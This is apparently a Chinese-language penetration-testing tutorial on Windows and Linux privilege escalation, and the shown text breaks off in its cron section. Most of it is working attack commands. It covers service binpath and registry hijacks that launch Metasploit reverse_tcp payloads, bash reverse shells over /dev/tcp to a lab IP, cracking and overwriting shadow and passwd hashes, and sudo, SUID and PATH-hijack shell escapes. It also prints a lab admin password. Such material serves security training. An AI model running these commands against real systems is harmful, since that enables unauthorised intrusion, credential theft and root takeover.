| **-i**        | 转储完整访问控制列表时，忽略仅具有继承的 ACE 的对象。        |
| **-k**        | 名称是注册表项，例如 `hklm\software`                         |
| **-l**        | 显示完整的安全描述符。 添加 `-i` 以忽略继承的 ACE。          |
| **-n**        | 仅显示没有访问权限的对象                                     |
| **-o**        | 名称是对象管理器命名空间中的对象（默认为根）。 若要查看目录中的内容，请指定以斜杠为结尾的名称，或添加 `-s`。 添加 `-t` 和对象类型（如部分），以便仅查看特定类型的对象。 |
| **-p**        | 名称是进程名称或 PID，例如 `cmd.exe`（将 `"*"` 指定为显示所有进程的名称）。 添加 `-f` 以显示包括组和权限在内的进程令牌完整信息。 添加 `-t` 以显示线程。 |
| **-nobanner** | 不显示启动横幅和版权消息。                                   |
| **-r**        | 仅显示具有访问权限的对象                                     |
| **-s**        | Recurse                                                      |
| **-t**        | 对象类型筛选器，例如 `"section"`                             |
| **-u**        | 禁止显示错误                                                 |
| **-v**        | 详细（包括 Windows Vista 完整性级别）                        |
| **-w**        | 仅显示具有写入权限的对象                                     |



##### ② 替换服务为攻击载荷

“`Authenticated Users`” 组对 `phpstudysrv` 服务具有 `SERVICE_QUERY_CONFIG` 权限。

此时执行以下命令，将该**服务启动时执行的二进制文件**替换为**预先上传的攻击载荷**。

当服务重启时，**载荷会随着服务的启动继承系统权限**

```python
计算机\HKEY LOCAL MACHINE\SYSTEM\CurrentControlSet\Services\phpstudySrv
```

![image-20241010092412244](https://image.201068.xyz/assets/38.后渗透/image-20241010092412244.png)

```bash
sc config phpstudysrv binpath= "cmd.exe /c C:\phpstudy_pro\WWW\vul\rce\msf_8888.exe"

wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:Windows" |findstr/i /v """

#恢复配置
sc config phpstudysrv binpath= "C:\phpstudy_pro\COM\phpStudyServer.exe -SCM"
```



![image-20241010092633835](https://image.201068.xyz/assets/38.后渗透/image-20241010092633835.png)

![image-20241010092932383](https://image.201068.xyz/assets/38.后渗透/image-20241010092932383.png)

##### msf监听

```python
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lport 8888
run
```

![image-20241010093111222](https://image.201068.xyz/assets/38.后渗透/image-20241010093111222.png)

##### 重启服务 

如果当前用户对该服务拥有`SERVICE_STOP`和 `SERVICE_START`权限，意味着用户拥有**对服务的重启权限**，可以直接执行命令重启服务。

```python
sc stop phpstudysrv
sc start phpstudysrv
```

![image-20241010093240162](https://image.201068.xyz/assets/38.后渗透/image-20241010093240162.png)

![image-20241010094008744](https://image.201068.xyz/assets/38.后渗透/image-20241010094008744.png)

![image-20241010093332543](https://image.201068.xyz/assets/38.后渗透/image-20241010093332543.png)

> 过几秒服务就掉了

如果没有权限，对于启动类型为“**自动**”的服务，就可以尝试通过**重新启动计算机**的方法来实现服务重启。

### 5.2.服务注册表权限脆弱

Windows 的注册表中存储了每个系统服务的条目，而注册表使用`ACL`来管理用户对其所拥有的访问权限。

如果**注册表的ACL配置错误**，使得一个**低权限用户对服务的注册表拥有写入权限**，此时可以通过修改注册表来更改服务配置。

例如，修改注册表中的 `ImagePath` 键，从而**变更服务启动时的二进制文件路径**。

#### 漏洞环境设计

在靶机执行，用来设置漏洞环境，实际环境无需这一步

访问如下注册表路径，

```python
HKLM\SYSTEM\CurrentControlSet\Services
```

右键选择**权限**，点击**添加**，输入 `Authenticated Users` 后点击确定

![image-20241010094346711](https://image.201068.xyz/assets/38.后渗透/image-20241010094346711.png)

给予**完全控制权限**后点击确认

![image-20241010094408961](https://image.201068.xyz/assets/38.后渗透/image-20241010094408961.png)

#### 漏洞复现

##### ① 枚举具有写入权限的服务

执行以下命令，通过`AccessChk`在目标主机中枚举“`Authenticated Users`”用户组具有写入权限的服务注册表

```python
accesschk.exe /accepteula -uvwqk "Authenticated Users" HKLM\SYSTEM\CurrentControlSet\Services
```

![image-20241010094502549](https://image.201068.xyz/assets/38.后渗透/image-20241010094502549.png)

##### ② 服务路径替换

“`Authenticated Users`”用户组对 `phpstudysrv` 服务的注册表拥有**完全控制权限**。

将该**服务注册表**中的 `ImagePath` 键指向**预先上传的攻击载荷**。

```python
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\phpstudysrv /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\phpstudy_pro\WWW\vul\rce\msf_8888.exe" /f


#恢复
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\phpstudysrv /v ImagePath /t REG_EXPAND_SZ /d "C:\phpstudy_pro\COM\phpStudyServer.exe -SCM" /f

#或
sc config phpstudysrv binpath= "C:\phpstudy_pro\COM\phpStudyServer.exe -SCM"
```

![image-20241010094619241](https://image.201068.xyz/assets/38.后渗透/image-20241010094619241.png)

##### msf监听

```python
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lport 8888
run
```

![image-20241010101615808](https://image.201068.xyz/assets/38.后渗透/image-20241010101615808.png)

##### 重启服务

```python
sc stop phpstudysrv
sc start phpstudysrv
```

![image-20241010102228270](https://image.201068.xyz/assets/38.后渗透/image-20241010102228270.png)

> 权限不足，需要高权限的用户触发 
>
> administrator / Qwe.123

![image-20241010101910392](https://image.201068.xyz/assets/38.后渗透/image-20241010101910392.png)

![image-20241010102034168](https://image.201068.xyz/assets/38.后渗透/image-20241010102034168.png)

![image-20241010101941429](https://image.201068.xyz/assets/38.后渗透/image-20241010101941429.png)

### 5.3.未引用的服务路径

末引用的服务路径 （`Unquoted Service Path`）漏洞曾被称为**可信任的服务路径**（Trusted Service Path），利用了 Windows 文件路径解析的特性。

当服务启动时所执行文件的路径中**包含空格且未包含在引号中时**，就会导致该漏洞。

如果完整路径中包含空格且未包含在引号中，那么对于该路径中的每个空格，Windows 会按照从左到右的顺序依次尝试寻找并执行与空格前的名字相匹配的程序。

例如.对于路径 `C:\Program Files\Sub Dir\Program Name.exe`，系统依次寻找并执行以下程序

```python
C:\Program.exe
C:\Program Files\Sub.exe
C:\Program Files\Sub Dir\Program.exe
C:\Program Files\Sub Dir\Program Name.exe
```

注意，当系统在**依次尝试服务路径中的空格**时，会**以当前服务所拥有的权限进行**。

因此，我们可以将一个经过特殊命名的攻击载荷上传到受影响的目录中，**当重启服务时，攻击载荷将随着服务的启动继承系统权限**。

但前提是**当前用户对受影响的目录具有写入权限**。

#### 漏洞环境设计

在靶机执行，用来设置漏洞环境，实际环境无需这一步

1.创建文件夹和其子文件夹命名为“`admin Data`”和“`Vuln Services`”，以**管理员**打开cmd

```python
mkdir "C:\Program File\admin Data\Vuln Service"
```

2.创建名为 `vulns` 的易受攻击的服务

```python
sc create "vulns" binpath= "C:\Program File\admin Data\Vuln Service\file.exe" start= auto
```

![image-20241010094948182](https://image.201068.xyz/assets/38.后渗透/image-20241010094948182.png)

3.为 `admin Data` 目录设置**可写权限**

![image-20241010094925561](https://image.201068.xyz/assets/38.后渗透/image-20241010094925561.png)

4.要创建一个易受攻击的服务，我们需要在`SubinACL`的帮助下**分配一些高风险的特权来改变服务的权限**

```python
subinacl.exe /service vulns /grant="Authenticated Users"=PTO
```

![image-20241010095058742](https://image.201068.xyz/assets/38.后渗透/image-20241010095058742.png)

到这里漏洞环境就搭建好了

#### 使用MSF利用漏洞

理论上讲，如果一个服务的可执行文件的**路径没有用双引号封闭**，并且**包含空格**，那么这个服务就是有漏洞的。

##### 1.寻找没有加引号的服务路径

```python
wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr/i /v """
```

![image-20241010095531899](https://image.201068.xyz/assets/38.后渗透/image-20241010095531899.png)

由执行结果可知，`vulns` 这个服务的 `PathName` 为 `D:\Program Files\admin Data\Vuln Service\file.exe`，其中**存在空格且没用使用引号**进行包裹。

##### 2.检查受影响的目录

用 Accesschk 检查受影响的目录，发现当前用户对受影响的目录拥有**完全控制权限**

```python
accesschk.exe /accepteula -quv "Authenticated Users" "C:\Program File\admin Data\"
```

![image-20241010095609834](https://image.201068.xyz/assets/38.后渗透/image-20241010095609834.png)

##### 3.上传攻击载荷

此时可以向 `C:\Program File\admin Data` 目录上传一个名为“ `Vuln .exe`” 的攻击载荷。

```python
upload /root/tools/msf/"Vuln .exe" C:\\"Program File"\\"admin Data"\\"Vuln .exe"
```

![image-20241010100317483](https://image.201068.xyz/assets/38.后渗透/image-20241010100317483.png)

![image-20241010100340175](https://image.201068.xyz/assets/38.后渗透/image-20241010100340175.png)

服务重启后，系统会按照前文中说过的顺序依次检查服务路径

当检查到 `D:\Program Files\admin Data\Vuln.exe` 时，攻击载荷将以SYSTEM权限执行

##### 4.msf开始攻击

```python
background
sessions -l
use windows/local/unquoted_service_path
set session 5
run
```

![image-20241010101406626](https://image.201068.xyz/assets/38.后渗透/image-20241010101406626.png)

# Linux提权

## Linux提权

### 反弹 shell


```bash
bash -c 'bash -i >& /dev/tcp/192.168.70.4/5555 0>&1'
```

> `bash -c`：指定使用bash这个shell来执行后面的命令
>
> `bash -i`：启动一个交互式的shell
>
> `>&`：标准输出和错误输出都进行重定向
>
> `/dev/tcp/192.168.70.4/5555`：要重定向到的位置此处为192.168.70.4:5555
>
> `0>&1`：把标准输入重定向到标准输出

由于反弹shell得到的终端是半交互终端，很多命令用不了，所以可以使用下列方法升级为全交互终端

```python
#把使用的shell切换到bash。
bash			

# 使用Python来创建一个新的终端并在这个终端中启动bash。
python -c 'import pty; pty.spawn("/bin/bash")'		

# 将当前的进程（这里是反弹shell）发送到后台。
ctrl+z

# 改变终端的模式，使其进入“原始”模式，并关闭回显。stty raw：将终端从"cooked"模式切换到"raw"模式。在"cooked"模式下，终端会处理例如行编辑.回显等特性。而在"raw"模式下，这 些特性都是禁用的，数据会直接从键盘传到程序，没有任何处理。
stty raw -echo

# 将之前已经发送到后台的进程（在这里是你的反弹shell）带回到前台。
fg					

# 重置和初始化终端。
reset				

# 设置使用的shell为bash
export SHELL="bash"		 
```

#### 总结

```python
nc -lvvp 8888

bash -c 'bash -i >& /dev/tcp/192.168.70.29/8888 0>&1'

bash
python -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset
export SHELL="bash"
```

![image-20241010153439308](https://image.201068.xyz/assets/38.后渗透/image-20241010153439308.png)

![image-20241010153502279](https://image.201068.xyz/assets/38.后渗透/image-20241010153502279.png)

## 一.利用 shadow 和 passwd 文件配置错误提权

### /etc/shadow 和 /etc/passwd 简介

#### /etc/passwd文件

是用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以读取此文件内容。

文件内数据格式如下

> 用户名:密码:UID（用户ID）:GID（组ID）:描述性信息:主目录:

密码字段的"`x`" 表示此用户设有密码，但不是真正的密码，真正的密码保存在 `/etc/shadow` 文件中

#### /etc/shadow文件

用于存储 Linux 系统中用户的密码信息，又称为“`影子文件`”。

由于/etc/passwd 文件允许所有用户读取，易导致用户密码泄露，因此 Linux 系统将用户的密码信息从 /etc/passwd 文件中分离出来，并单独放到了此文件中。/etc/shadow 文件只有 root 用户拥有读限，其他用户没有任何权限，这样就保证了用户密码的安全性。

文件内数据格式如下

> 用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段 

```bash
$6$AtKftWj1$mDa4mwv3STbE51AbtgC8uj.pgnvHFyn2rlKnIV0MA9uufIXCBJKURVwRLEItfCNGrFnaCpnNUcznQMJ/tR7el.
```

> 其中密码字段分为三部分，每部分用 `$` 分隔
>
> `$6$`: 这部分表示了密码散列算法的类型，`$6$`表示该密码使用了 SHA-512 算法，`$5$`: 表示采用 SHA-256 加密，`$1$`: 表示采用 MD5 加密
>
> `AtKftWj1`: 这部分是“**盐值**”（`Salt`），用于增加密码破解的难度。这个盐值将与用户的明文密码一起作为 SHA-512 散列函数的输入，使得即使两个用户使用了相同的明文密码，他们的散列密码也会不同。 
>
> `mDa4mwv3STbE51AbtgC8uj.pgnvHFyn2rlKnIV0MA9uufIXCBJKURVwRLEItfCNGrFnaCpnNUcznQMJ/tR7el.`: 这部分是 SHA-512 加盐哈希算法处理过的密码散列值

### 1.1.可读 shadow文件利用

`/etc/shadow` 文件包含用户的密码哈希值，通常只有 root 用户可读，如果普通用户也能对 `/etc/shadow` 文件进行读取，那么我们就能利用可读的 `/etc/shadow`提权。

对于可读的`/etc/shadow`﻿文件：可以读取用户的哈希并使用 ﻿`john the ripper`﻿ 或`hash`。

#### 查看/etc/shadow文件权限

`cat`﻿ 执行暴力攻击使用下方命令查看 `/etc/shadow` **文件权限**分配情况

```python
ls -l /etc/shadow
```

![image-20241010153532675](https://image.201068.xyz/assets/38.后渗透/image-20241010153532675.png)

#### 读取文件内容

使用下方命令读取 `/etc/shadow` 文件内容

```python
cat /etc/shadow
```

![image-20241010153604730](https://image.201068.xyz/assets/38.后渗透/image-20241010153604730.png)

#### 破解root用户信息

找到 `root` 用户信息，将其复制到 `kali` 存放到文件中，执行下方命令进行破解

```bash
root:$6$rYr3FjS2$j7dJWIoN0/.Ae6O3QzkcldKx9mryqO.AwqeGkaGmHfGAZKgLtwYqARK6BQSPYVnaSoZ0F7mRmELZNCBMBhvon/:19695:0:99999:7:::
```

##### john

```python
sudo apt-get install john
```



```bash
cd /root/tools/dict
echo 'root:$6$rYr3FjS2$j7dJWIoN0/.Ae6O3QzkcldKx9mryqO.AwqeGkaGmHfGAZKgLtwYqARK6BQSPYVnaSoZ0F7mRmELZNCBMBhvon/' > hash.txt

john --wordlist=password.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![image-20241010160824644](https://image.201068.xyz/assets/38.后渗透/image-20241010160824644.png)

> 注：john 对于同一个信息只会进行一次爆破，
>
> 如果第一次爆破成功，那么第二次执行 john 是不会得到结果的，如果想查看上一次爆破的结果，可以使用以下命令。

```python
john --show hash.txt

cat /root/.john/john.pot
echo > /root/.john/john.pot
```

![image-20241010160847949](https://image.201068.xyz/assets/38.后渗透/image-20241010160847949.png)

![image-20241010160930515](https://image.201068.xyz/assets/38.后渗透/image-20241010160930515.png)

### 1.2.可写shadow 文件利用

`/etc/shadow` 文件包含用户的**密码哈希值**，通常只有 `root` 用户可写，

如果普通用户也能对 `/etc/shadow` 文件进行**写入**，那么我们就能利用**可写**的 `/etc/shadow` 提权。

在上一节中，使用 " `ls -l /etc/shadow` " 查看 `/etc/shadow` 文件的**权限分配情况**时，发现其他用户能够对 `/etc/shadow` 文件进行**读写**。

#### 查看/etc/shadow文件权限

```python
ls -l /etc/shadow
```

![image-20241010162215939](https://image.201068.xyz/assets/38.后渗透/image-20241010162215939.png)

#### 生成hash值

##### mkpasswd

```python
sudo apt-get install whois
```

对于可写的﻿`/etc/shadow`﻿文件，可以使用 kali 自带的 `mkpasswd` 工具来自定义密码**生成一个新的 hash 值**:

```python
mkpasswd -m sha-512 newpassword
```

> 密码：newpassword
>
> 从前面的提权方法中，root用户的密码hash值使用的算法类型 sha512crypt

![image-20241010161723627](https://image.201068.xyz/assets/38.后渗透/image-20241010161723627.png)

```bash
$6$p.wS9y3xl4i$Rh0DvYER94lLT/tnrdbO9l16Bn773.6peomyKGx0XZUreOX.BCZuJNwrr91h5HBOFmoGH7uJz.BfVnbdoKCE71
```

#### 备份文件

执行下方命令，将 `/etc/shadow` 文件进行备份，防止修改时出现意外状况。

```python
cp /etc/shadow /tmp/shadow.bak
```

![image-20241010161753248](https://image.201068.xyz/assets/38.后渗透/image-20241010161753248.png)

#### 替换密码散列值

编辑 `/etc/shadow` 文件，并用刚刚生成的密码散列 (hash) 值**替换**原 root 用户的**密码散列值**，

```bash
vim /etc/shadow

root:$6$p.wS9y3xl4i$Rh0DvYER94lLT/tnrdbO9l16Bn773.6peomyKGx0XZUreOX.BCZuJNwrr91hh5HBOFmoGH7uJz.BfVnbdoKCE71:19695:0:99999:7:::
```

![image-20241010161927308](https://image.201068.xyz/assets/38.后渗透/image-20241010161927308.png)

#### 切换到 root 用户

然后使用自己设置的密码切换到 root 用户，得到 root 权限：

```python
su root

newpassword
```

![image-20241010162433993](https://image.201068.xyz/assets/38.后渗透/image-20241010162433993.png)

### 1.3.可写 passwd 文件利用

`/etc/passwd` 文件包含有关用户帐户的信息，通常只能由 root 用户写入。

在以前 Linux 发行版中 `/etc/passwd` 文件会包含用户的密码哈希值，而且现在大部分的 Linux 都在 `/etc/shadow` 文件中存储用户的密码哈希值。

但Linux系统**为了向后兼容**，有如下**特性**：如果 `/etc/passwd` 中**用户行的第二个字段包含密码哈希**，它将优先于 `/etc/shadow` 中的哈希。

#### 查看/etc/passwd文件权限

使用下方命令查看 `/etc/passwd` 文件权限分配情况

```python
ls -l /etc/passwd
```

####  生成密码hash值

##### opeenssl



在 `kali` 中使用 `opeenssl` 生成一个新的密码 hash 值：

```python
openssl passwd 123456
```

> 密码：123456

![image-20241010163059477](https://image.201068.xyz/assets/38.后渗透/image-20241010163059477.png)

```bash
$1$RaMnajbK$uPG5NxGvTjJ3LNXnLKvye/
```

####  替换" x"

编辑 `/etc/passwd` 文件，并将刚才**新生成的密码 hash** 放置在 root 用户行的第一个和第二个冒号(`:`)之间(**替换" `x`"**)，

```bash
cp /etc/passwd /tmp/passwd.bak
vim /etc/passwd

root:$1$RaMnajbK$uPG5NxGvTjJ3LNXnLKvye/:0:0:root:/root:/bin/bash
```

#### 切换到root

然后切换到 `root` 用户，使用新密码登录:

```python
su root

123456
```

![image-20241010163318649](https://image.201068.xyz/assets/38.后渗透/image-20241010163318649.png)

## 二.SUDO滥用提权

`sudo`是linux系统管理指令，是允许**系统管理员**让**普通用户**执行一些或者全部的 **root 命令**的一个工具，如`reboot`，`su`等等。

这样不仅减少了root用户的登录和管理时间，同样也提高了安全性。

sudo不是对shell的一个代替，它是**面向每个命令**的。

在一些应用场景里面，为了方便运维人员以低权限帐号进行运维，往往会开启帐号的一些SUDO权限给运维帐号，

而`SUDO`权限的授予在`/etc/sudoers`中进行操作。

### 查看SUDO权限

```python
ls -l /etc/sudoers
cat /etc/sudoers
```

![image-20241010164013275](https://image.201068.xyz/assets/38.后渗透/image-20241010164013275.png)

![image-20241010164331127](https://image.201068.xyz/assets/38.后渗透/image-20241010164331127.png)

```python
ubuntu  ALL=(ALL:ALL) NOPASSWD:/usr/bin/vim
ubuntu  ALL=(ALL:ALL) NOPASSWD:/usr/bin/awk
ubuntu  ALL=(ALL:ALL) NOPASSWD:/usr/bin/find
ubuntu  ALL=(ALL:ALL) NOPASSWD:/usr/bin/apt
ubuntu  ALL=(ALL:ALL) NOPASSWD:/usr/bin/less
```

#### 分析

```python
ubuntu ALL=(ALL:ALL) NOPASSWD:/usr/bin/apt-get
```

- `ubuntu`表示用户名
- 
  第一个 `ALL` 指示允许从任何终端访问`sudo`

- 
  第二个(`ALL:ALL`)指示sudo命令被允许**任意用户.任意组**执行

- 第三个 `NOPASSWD` 表示**不需要输入密码**而可以sudo执行的命令

### 常见sudo执行的命令

在渗透测试过程中，当获取低权限shell后，通常会运行 `sudo -l` 查看当前用户的权限。

如果查询结果表示配置了`ALL` 或者以下命令设置了`无密码sudo`，就可以进行提权。

```python
wget
find
cat
apt
zip
xxd
time
taskset
git
sed
pip
ed
tmux
scp
perl
bash
less
awk
man
vi
env
ftp
ed
screen
```

### sudo提权 

#### 一条命令提权

```python
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc/passwd -exec /bin/sh \;
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

##### vim

```python
sudo vim -c '!sh'
```

![image-20241010165447809](https://image.201068.xyz/assets/38.后渗透/image-20241010165447809.png)

##### awk

```python
sudo awk 'BEGIN {system("/bin/sh")}'
```

![image-20241010165519447](https://image.201068.xyz/assets/38.后渗透/image-20241010165519447.png)

##### find

```python
sudo find /etc/passwd -exec /bin/sh \;
```

![image-20241010165539946](https://image.201068.xyz/assets/38.后渗透/image-20241010165539946.png)

##### apt

```python
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

![image-20241010165602376](https://image.201068.xyz/assets/38.后渗透/image-20241010165602376.png)

#### 两条命令提权的

##### less

```python
sudo less /etc/hosts
!/bin/sh
```

![image-20241010165922809](https://image.201068.xyz/assets/38.后渗透/image-20241010165922809.png)

![image-20241010165943337](https://image.201068.xyz/assets/38.后渗透/image-20241010165943337.png)

#### 其他提权方式可参考：

##### GTFOBins

`GTFOBins` 该工具是一个用于搜索和收集有关`Linux`和`Unix`系统上的提权和绕过安全控制的信息的开源项目，可用于在配置错误的系统中绕过本地安全限制。

- 网站：https://gtfobins.github.io/
- github：https://github.com/GTFOBins/GTFOBins.github.io

![image-20241010170308886](https://image.201068.xyz/assets/38.后渗透/image-20241010170308886.png)

## 三.SUID提权

### 特殊权限

#### SUID

`SUID`  是Linux系统当中的一种特殊权限，

设置了 `SUID` 的**程序文件**，在用户执行该程序时，**用户的权限是该程序文件属主的权限**，

例如程序**文件的属主是root**，那么执行该程序的用户就将暂时获得root账户的权限。

#### SGID

还有一种特殊权限为`SGID`，它与SUID类似，只是**执行程序时获得的是文件属组的权限**。

`passwd` 这个命令程序的权限设置，它就是设置了 `SUID` 权限的。 

#### SUID有下列几点需要注意。


  1. 只有**可以执行的二进制程序文件**才能设定`SUID`权限,非二进制文件设置`SUID`权限没任何意义.


  2. 命令执行者要对该程序文件拥有**执行(`x`)权限**.


  3. 命令执行者在执行该程序时获得该程序**文件属主**的身份.

### SUID 提权原理

- 
  原理：利用某些设置了 `SUID` 权限的**可以执行的二进制文件**来通过 `root` 权限执行命令


#### 常见可提权的命令  

```python
nmap
vim
find
bash
more
less
nano
cp
awk
mv
```

##### 更多命令查看

https://gtfobins.github.io

#### 查找SUID文件

```python
find / -user root -perm -u=s -type f 2>/dev/null
```

> `find`：这是Linux系统上用于查找文件和目录的命令。
>
> `/`：表示从根目录开始查找，也就是整个文件系统。
>
> `-user root`：只查找属于"root"用户的文件。
>
> `-perm -u=s`：指定查找设置了SetUID（设置用户ID）权限的文件。
>
> `-type f`：只查找普通文件，而不是目录或其他类型的文件。
>
> `2>/dev/null`：屏蔽报错信息。

![image-20241010172138104](https://image.201068.xyz/assets/38.后渗透/image-20241010172138104.png)

```python
-bash-4.3$ find / -user root -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/bash
/usr/bin/lppasswd
/usr/bin/vim.basic
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/X
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/pppd
/usr/local/bin/suid-env
```

### 3.1.利用 find 提权

`find`命令通常用来在系统中查找文件，但是它也有执行命令的能力。

因此，如果配置为使用 `SUID` 权限运行，且**可执行文件的所有者为 root 用户**，那么通过 find 执行的命令都将以 root 身份去运行。


```bash
find / -user root -perm -u=s -type f 2>/dev/null 	#查找SUID文件，如果结果中存在 find 命令就可以利用提权
```
执行该命令进行提权

```python
find /etc/passwd -exec /bin/bash -p \;
```

> `find`：这是Linux系统上用于查找文件和目录的命令。
>
> `/etc/passwd`：指定了查找的起始点是 /etc/passwd 文件。
>
> `-exec`：find 命令的选项，用于执行指定的命令。
>
> `/bin/bash -p`：这是要执行的命令
>
> `\;`：这是 -exec 选项的一部分，用于表示命令的结束。`\;` 表示命令结束，可以执行下一个匹配项。

![image-20241010172303587](https://image.201068.xyz/assets/38.后渗透/image-20241010172303587.png)

### 3.2.利用 bash 提权

bash 命令通常用来在打开一个shell，但是它也有执行命令的能力。 

因此，如果为 bash 配置了使用 SUID 权限运行，且 bash 文件的所有者为 root 用户，那么通过 bash 执行的命令都将以 root 身份去运行。

```python
find / -user root -perm -u=s -type f 2>/dev/null 	#查找SUID文件，如果结果中存在 find 命令就可以利用提权					
```

执行该命令进行提权

```python
bash -p
```

> 注意：在执行 bash 命令时一点要添加 `-p` 参数，否则提权不成功
>
> 因为如果启动 bash 时的 `Effective UID` 与 `Real UID` 不相同，而且没有使用 -p 参数，则 bash 会将 `Effective UID` 还原成 `Real UID`。
>
> `Real UID` 执行该进程的用户实际的UID
>
> `Effective UID` 程序实际操作时生效的UID，suid 的程序启动时，Effective UID 就等于二进制文件的所有者

![image-20241010172402437](https://image.201068.xyz/assets/38.后渗透/image-20241010172402437.png)

### 3.3.SUID环境变量提权

`PATH` 是Linux和类Unix操作系统中的**环境变量**，类似 windows 中的 path 环境变量，

当我们执行一个命令的时候 shell 会先检查命令是否是系统内部命令，如果不是则会再去检查此命令是否是一个应用程序，

shell 会试着**从 PATH 中逐步查找命令**，查看环境变量命令如下：

#### 查看PATH环境变量

```bash
echo $PATH
```

如果我们可以在环境变量中写入自己的环境变量，

然后写一个自己的恶意命令，配合 `SUID` 文件即可达到提权的目的。

![image-20241010172514094](https://image.201068.xyz/assets/38.后渗透/image-20241010172514094.png)

#### 实验演示

执行下方命令查找具有 SUID 权限的文件，发现一个名为 `suid-env` 的文件

```python
find / -user root -perm -u=s -type f 2>/dev/null 		#查找SUID文件，如果结果中存在 find 命令就可以利用提权
```

![image-20241010172559433](https://image.201068.xyz/assets/38.后渗透/image-20241010172559433.png)

```python
/usr/local/bin/suid-env
```

##### 配置靶场环境

```python
sudo cp /home/ubuntu/桌面/suid-env /usr/local/bin/
```

![image-20241010172820291](https://image.201068.xyz/assets/38.后渗透/image-20241010172820291.png)

![image-20241010172926764](https://image.201068.xyz/assets/38.后渗透/image-20241010172926764.png)

##### 提取可打印的文本字符串

执行下方命令从二进制文件中提取可打印的文本字符串，

发现在执行此文件时会使用 `ps aux` 命令查看进程，但是此处在使用 ps 时写的是相对路径去使用的

```python
strings /usr/local/bin/suid-env
```

![image-20241010173457673](https://image.201068.xyz/assets/38.后渗透/image-20241010173457673.png)

##### 创建ps文件

所以我们就可以在一个**有写权限的目录**下创建一个**与 ps 同名的文件**，文件内写我们的**提权命令**

> /bin/bash

```python
echo "/bin/bash" > /tmp/ps 		
chmod 777 /tmp/ps 			
ls -al /tmp/ps
```

![image-20241010173614558](https://image.201068.xyz/assets/38.后渗透/image-20241010173614558.png)

##### 加入环境变量

然后将**该目录加入到环境变量**中，

```bash
echo $PATH
```

> `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games`

```bash
export PATH=/tmp:$PATH
echo $PATH
```

> 将 /tmp 目录添加到原本的 $PATH 变量之前
>
> 因为在寻找路径时是**从左到右**寻找的，所以会找到我们的恶意文件去执行

![image-20241010180910010](https://image.201068.xyz/assets/38.后渗透/image-20241010180910010.png)

##### **执行** suid-env

此时**执行** `suid-env` 时就会运行我们的提权脚本了

```python
/usr/local/bin/suid-env
```

![image-20241010180937360](https://image.201068.xyz/assets/38.后渗透/image-20241010180937360.png)

## 四.计划任务提权

Linux计划任务是 Linux 系统中用于定时执行任务的一种机制。

通过计划任务，用户可以安排脚本或命令**在特定时间自动执行**，这对于定期执行系统维护任务，数据备份等操作非常有用。

但是如果**计划任务**配置不当，可能会被利用来获取系统的高级权限。

### /etc/crontab

`/etc/crontab`文件是系统范围内的Cron作业配置文件

```python
cat /etc/crontab | grep -v '#'
```

![image-20241010183036476](https://image.201068.xyz/assets/38.后渗透/image-20241010183036476.png)

```python
SHELL=/bin/sh
PATH=/home/ubuntu:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root overwrite.sh
```

#### 分析


```bash
SHELL=/bin/sh 	#设置了SHELL环境变量，指定了要在计划任务中使用的shell解释器为/bin/sh。
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin #设置了PATH环境变量，定义了cron作业的执行环境中的可执行文件搜索路径。

#接下来的每一行是一个计划任务条目，
#这些条目遵循cron的标准格式：分钟(0-59) 小时(0-23) 月中的哪一天(1-31) 月份(1-12) 星期几(0-7) 用户 命令
 
17 *   * * * root    cd / && run-parts --report /etc/cron.hourly
#第一个计划任务（第七行）将在每小时的第17分钟以root用户身份运行/etc/cron.hourly目录中的所有脚本文件。
  
25 6   * * * root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
#第二个计划任务（第八行）将在每天早上6点25分以root用户身份运行/etc/cron.daily目录中的所有脚本文件。

47 6   * * 7 root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
#第三个计划任务（第九行）将在每周的星期天早上6点47分以root用户身份运行/etc/cron.weekly目录中的所有脚本文件。
 
52 6   1 * * root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#第四个计划任务（第十行）将在每月的1号早上6点52分以root用户身份运行/etc/cron.monthly目录中的所有脚本文件。
```
#### 示意图

```python
* * * * * user-name command-to-be-executed
- - - - -
| | | | |
| | | | +----- 周几 (0 - 7) (0和7都代表星期日)
| | | +------- 月份 (1 - 12)
| | +--------- 月中的哪一天 (1 - 31)
